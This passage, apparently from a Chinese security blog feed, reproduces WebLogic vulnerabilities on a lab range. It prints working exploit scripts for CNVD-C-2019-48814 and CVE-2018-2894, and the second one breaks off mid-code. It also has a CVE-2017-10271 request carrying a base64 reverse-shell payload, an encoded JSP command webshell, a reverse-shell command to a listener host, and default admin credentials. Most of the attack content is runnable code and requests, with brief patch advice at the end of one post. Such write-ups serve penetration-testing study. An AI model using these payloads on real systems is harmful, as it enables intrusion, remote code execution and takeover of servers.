  &#125;<br><br>response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, data=payload, headers=headers)<br><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;status_code:%s&quot;</span> % <span class="hljs-built_in">str</span>(response.status_code)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python async_reserve_shell.py http:<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.100</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/_async/</span>AsyncResponseService <span class="hljs-number">10.1</span>.<span class="hljs-number">1.200</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>成功反弹</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209183647200.png" alt="image-20240209183647200"></p><p>0x03</p><p>利用 CNVD-C-2019-48814  上传webshell </p><p>直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: jas502n</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># url = &quot;http://10.10.20.166:7001/_async/AsyncResponseService&quot;</span><br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>url_dir = <span class="hljs-string">&quot;/_async/AsyncResponseService&quot;</span><br>vuln_url = url + url_dir<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              _         _          _ _ </span><br><span class="hljs-string">             | |       | |        | | |</span><br><span class="hljs-string">__      _____| |__  ___| |__   ___| | |</span><br><span class="hljs-string">\ \ /\ / / _ \ &#x27;_ \/ __| &#x27;_ \ / _ \ | |</span><br><span class="hljs-string"> \ V  V /  __/ |_) \__ \ | | |  __/ | |</span><br><span class="hljs-string">  \_/\_/ \___|_.__/|___/_| |_|\___|_|_|</span><br><span class="hljs-string">                                       </span><br><span class="hljs-string">               By jas502n        </span><br><span class="hljs-string">               </span><br><span class="hljs-string">        No Pactch  For  CVE-2017-10271</span><br><span class="hljs-string">        </span><br><span class="hljs-string">       _async/AsyncResponseService RCE                  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n&gt;&gt;&gt;&gt;Usage: python webshell.py url webshell.jsp\n&quot;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&gt;&gt;&gt;The Vuln Url: %s&quot;</span> % vuln_url<br><span class="hljs-built_in">print</span><br>webshell_name = sys.argv[<span class="hljs-number">2</span>]<br>webshell_dir = <span class="hljs-string">&quot;servers/examplesServer/tmp/_WL_internal/bea_wls9_async_response/tfmgqe/war/&quot;</span><br>payload = <span class="hljs-string">&quot;&lt;soapenv:Envelope xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; xmlns:wsa=\&quot;http://www.w3.org/2005/08/addressing\&quot; xmlns:asy=\&quot;http://www.bea.com/async/AsyncResponseService\&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=\&quot;http://bea.com/2004/06/soap/workarea/\&quot;&gt;&lt;java version=\&quot;1.4.0\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\r\n      &lt;void class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\r\n        &lt;array class=\&quot;java.lang.String\&quot; length=\&quot;3\&quot;&gt;\r\n          &lt;void index=\&quot;0\&quot;&gt;\r\n            &lt;string&gt;/bin/bash&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\&quot;1\&quot;&gt;\r\n            &lt;string&gt;-c&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\&quot;2\&quot;&gt;\r\n            &lt;string&gt;echo IDwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YS5pby4qIiU+CjwlCiU+CjxIVE1MPjxCT0RZPgpDb21tYW5kcyB3aXRoIEpTUAo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICBvdXQucHJpbnRsbigiQ29tbWFuZDogIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7CiAgICBQcm9jZXNzIHA7CiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsKICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICBJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgIFN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7CiAgICB3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsKICAgIG91dC5wcmludGxuKGRpc3IpOwogICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgfQp9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPiAKCg== |base64 -d &gt; %s%s&lt;/string&gt;\r\n          &lt;/void&gt;\r\n        &lt;/array&gt;\r\n        &lt;void method=\&quot;start\&quot;/&gt;&lt;/void&gt;\r\n    &lt;/java&gt;\r\n&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;&quot;</span> % (webshell_dir,webshell_name)<br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&quot;close&quot;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&quot;2163&quot;</span>,<br>    <span class="hljs-string">&#x27;cache-control&#x27;</span>: <span class="hljs-string">&quot;no-cache&quot;</span><br>    &#125;<br><br>response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, vuln_url, data=payload, headers=headers)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n\nWebshell: \n&quot;</span><br><span class="hljs-built_in">print</span> url + <span class="hljs-string">&quot;/_async/&quot;</span> + webshell_name + <span class="hljs-string">&quot;?cmd=whoami&quot;</span><br><br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209192401823.png" alt="image-20240209192401823"></p><p>访问这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209192536148.png" alt="image-20240209192536148"></p><p>复现完毕</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><blockquote><p>目前，Oracle官方暂未发布补丁，临时解决方案如下：</p><p>1、找到并删除wls9_async_response.war、wls-wsat.war 并重启Weblogic服务</p><p>2、通过访问策略控制禁止&#x2F;_async&#x2F;* 及 &#x2F;wls-wsat&#x2F;* （注意） 路径的URL访问。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weblogic漏洞复现</title>
    <link href="/2024/02/08/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/02/08/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Weblogic-WeakPasswd"><a href="#Weblogic-WeakPasswd" class="headerlink" title="Weblogic-WeakPasswd"></a>Weblogic-WeakPasswd</h1><p>0x00</p><p>发现一个weblogic</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208210927335.png" alt="image-20240208210927335"></p><p>搜索weblogic后台，直接查看console</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208211447184.png" alt="image-20240208211447184"></p><p>然后发现这个，尝试默认的密码</p><blockquote><p><a href="https://cirt.net/passwords?criteria=weblogic">https://cirt.net/passwords?criteria=weblogic</a></p></blockquote><p>发现密码是</p><blockquote><p>账号：weblogic 密码：Oracle@123</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208212502261.png" alt="image-20240208212502261"></p><p>0x01</p><p>部署jar包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208212912182.png" alt="image-20240208212912182"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208212937258.png" alt="image-20240208212937258"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208213136034.png" alt="image-20240208213136034"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208213507459.png" alt="image-20240208213507459"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208213532934.png" alt="image-20240208213532934"></p><p>上传成功</p><p>0x02</p><p>连接蚁剑</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208213717165.png" alt="image-20240208213717165"></p><h1 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h1><p>使用的是蚁景 的靶场，然后发现了弱口令… </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208215503172.png" alt="image-20240208215503172"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208215448841.png" alt="image-20240208215448841"></p><p>0x00 </p><p>发现了weblogic 然后进行扫描发现漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208215846164.png" alt="image-20240208215846164"></p><p>查看了10271 发现是一个</p><p>0x01</p><p>开启监听9999端口</p><p>0x02</p><p>尝试利用</p><p>抓一个包，修改成</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>http://target.yijinglab.com:58169/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>668<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">echo YmFzaCAtaSA+JiAvZGV2LcC84LjEzMC4xMjMuMjUvOTk5OSAYxIA==|base64 -d|bash -i<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208222227441.png" alt="image-20240208222227441"></p><p>利用成功</p><h1 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h1><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240208234249671.png" alt="image-20240208234249671"></p><p>还是一个Weblogic</p><p>0x01</p><p>直接利用<strong>CVE-2018-2894</strong></p><p>使用exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-comment"># Build By LandGrey</span><br><span class="hljs-comment"># Modify By mingy</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_work_path</span>(<span class="hljs-params">host</span>):<br>    geturl = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/resources/setting/options/general&quot;</span><br>    ua = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&#x27;</span>&#125;<br>    values = []<br>    <span class="hljs-keyword">try</span>:<br>        request = requests.get(geturl)<br>        <span class="hljs-keyword">if</span> request.status_code == <span class="hljs-number">404</span>:<br>            exit(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;Deploying Application&quot;</span>.lower() <span class="hljs-keyword">in</span> request.text.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] First Deploying Website Please wait a moment ...&quot;</span>)<br>            time.sleep(<span class="hljs-number">20</span>)<br>            request = requests.get(geturl, headers=ua)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;/defaultValue&gt;&quot;</span> <span class="hljs-keyword">in</span> request.content.decode():<br>            root = ET.fromstring(request.content)<br>            value = root.find(<span class="hljs-string">&quot;section&quot;</span>).find(<span class="hljs-string">&quot;options&quot;</span>)<br>            <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> value:<br>                values.extend(<br>                    sub.text<br>                    <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> e<br>                    <span class="hljs-keyword">if</span> e.tag == <span class="hljs-string">&quot;parameter&quot;</span> <span class="hljs-keyword">and</span> sub.tag == <span class="hljs-string">&quot;defaultValue&quot;</span><br>                )<br>    <span class="hljs-keyword">except</span> requests.ConnectionError:<br>        exit(<span class="hljs-string">f&quot;[-] Cannot connect url: <span class="hljs-subst">&#123;geturl&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> values:<br>        <span class="hljs-keyword">return</span> values[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Cannot get current work path\n&quot;</span>)<br>    exit(request.content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_new_work_path</span>(<span class="hljs-params">host</span>):<br>    origin_work_path = get_current_work_path(host)<br>    works = <span class="hljs-string">&quot;/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;user_projects&quot;</span> <span class="hljs-keyword">in</span> origin_work_path:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\\&quot;</span> <span class="hljs-keyword">in</span> origin_work_path:<br>            works = works.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br>            current_work_home = origin_work_path[:origin_work_path.find(<span class="hljs-string">&quot;user_projects&quot;</span>)] + <span class="hljs-string">&quot;user_projects\\domains&quot;</span><br>            dir_len = <span class="hljs-built_in">len</span>(current_work_home.split(<span class="hljs-string">&quot;\\&quot;</span>))<br>            domain_name = origin_work_path.split(<span class="hljs-string">&quot;\\&quot;</span>)[dir_len]<br>            current_work_home += <span class="hljs-string">&quot;\\&quot;</span> + domain_name + works<br>        <span class="hljs-keyword">else</span>:<br>            current_work_home = origin_work_path[:origin_work_path.find(<span class="hljs-string">&quot;user_projects&quot;</span>)] + <span class="hljs-string">&quot;user_projects/domains&quot;</span><br>            dir_len = <span class="hljs-built_in">len</span>(current_work_home.split(<span class="hljs-string">&quot;/&quot;</span>))<br>            domain_name = origin_work_path.split(<span class="hljs-string">&quot;/&quot;</span>)[dir_len]<br>            current_work_home += <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;domain_name&#125;</span><span class="hljs-subst">&#123;works&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        current_work_home = origin_work_path<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] cannot handle current work home dir: <span class="hljs-subst">&#123;current_work_home&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> current_work_home<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_new_upload_path</span>(<span class="hljs-params">host, path</span>):<br>    data = &#123;<br>        <span class="hljs-string">&quot;setting_id&quot;</span>: <span class="hljs-string">&quot;general&quot;</span>,<br>        <span class="hljs-string">&quot;BasicConfigOptions.workDir&quot;</span>: path,<br>        <span class="hljs-string">&quot;BasicConfigOptions.proxyHost&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;BasicConfigOptions.proxyPort&quot;</span>: <span class="hljs-string">&quot;80&quot;</span>&#125;<br>    request = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/resources/setting/options&quot;</span>, data=data, headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;successfully&quot;</span> <span class="hljs-keyword">in</span> request.content.decode():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Change New Upload Path failed&quot;</span>)<br>    exit(request.content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_webshell</span>(<span class="hljs-params">host, uri</span>):<br>    set_new_upload_path(host, 